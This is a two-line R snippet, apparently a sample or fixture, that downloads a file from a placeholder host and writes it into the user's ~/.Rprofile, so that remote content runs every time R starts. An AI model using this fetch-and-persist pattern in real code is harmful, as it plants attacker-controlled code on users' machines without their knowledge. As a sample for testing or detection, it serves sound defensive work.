download.file("https://example.test/rc", tmp)
writeLines(readLines(tmp), file.path("~", ".Rprofile"))
